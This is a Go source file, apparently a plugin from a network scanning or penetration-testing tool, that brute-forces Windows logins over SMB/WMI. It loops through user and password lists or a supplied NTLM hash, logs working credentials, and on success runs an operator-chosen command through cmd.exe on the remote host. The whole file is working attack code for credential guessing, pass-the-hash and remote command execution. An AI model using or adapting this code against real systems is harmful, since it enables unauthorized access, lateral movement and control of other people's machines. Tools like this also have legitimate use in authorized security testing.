package Plugins

import (
	"errors"
	"fmt"
	"fs/config"
	"os"
	"strings"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

var ClientHost string
var flag bool

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *config.HostInfo) (tmperr error) {
	if config.NoBrute {
		return nil
	}
	starttime := time.Now().Unix()
	for _, user := range config.Userdict["smb"] {
	PASS:
		for _, pass := range config.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := Wmiexec(info, user, pass, config.Hash)
			errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", info.Host, 445, user, pass, err)
			errlog = strings.Replace(errlog, "\n", "", -1)
			config.LogError(errlog)
			if flag == true {
				var result string
				if config.Domain != "" {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ", info.Host, info.Ports, config.Domain, user)
				} else {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v ", info.Host, info.Ports, user)
				}
				if config.Hash != "" {
					result += "hash: " + config.Hash
				} else {
					result += pass
				}
				config.LogSuccess(result)
				return err
			} else {
				tmperr = err
				if config.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(config.Userdict["smb"])*len(config.Passwords)) * config.Timeout) {
					return err
				}
			}
			if len(config.Hash) == 32 {
				break PASS
			}
		}
	}
	return tmperr
}

func Wmiexec(info *config.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	wmiexec.Timeout = int(config.Timeout)
	return WMIExec(target, user, pass, hash, config.Domain, config.Command, ClientHost, "", nil)
}

func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}
	execer := wmiexec.NewExecer(cfgIn)
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC Port is 0, cannot connect")
			return
		}

		err = execer.RPCConnect()
		if err != nil {
			return
		}
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
